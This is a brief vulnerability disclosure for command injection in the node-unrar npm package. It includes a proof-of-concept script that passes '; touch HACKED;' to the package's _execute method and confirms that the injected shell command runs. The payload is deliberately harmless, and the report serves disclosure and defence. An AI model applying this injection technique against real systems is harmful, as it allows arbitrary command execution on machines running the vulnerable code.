The issue occurs because a `user input` is formatted inside a `command` that will be executed without any check.

## Proof of Concept (Credit: [Mik317](https://huntr.dev/app/users/Mik317))
1. Create the following PoC file:
```js
// poc.js
var Unrar = require('node-unrar');
var rar = new Unrar('/path/to/file.rar');

rar._execute([], '; touch HACKED;', function(){});
```
2. Check there aren't files called `HACKED`
3. Execute the following commands in another terminal:
```bash
npm i node-unrar # Install affected module
node poc.js #  Run the PoC
```
4. Recheck the files: now `HACKED` has been created
## References:
 - [GitHub Issue](https://github.com/scopsy/node-unrar/issues/10)
 - [Issue Permalink](https://github.com/scopsy/node-unrar/blob/master/lib/index.js#L24)